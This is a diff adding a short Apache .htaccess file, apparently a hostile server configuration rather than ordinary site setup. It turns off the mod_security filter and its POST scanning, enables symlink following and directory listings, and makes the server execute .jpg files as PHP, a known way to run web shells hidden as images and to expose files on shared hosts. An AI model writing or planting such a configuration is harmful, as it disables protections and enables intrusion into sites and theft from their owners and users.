@@ -1,0 +1,13 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+
+Options +FollowSymLinks
+DirectoryIndex Index.html
+Options +Indexes
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType application/x-httpd-php .jpg
+AddType text/html .shtml
+AddHandler server-parsed .shtml
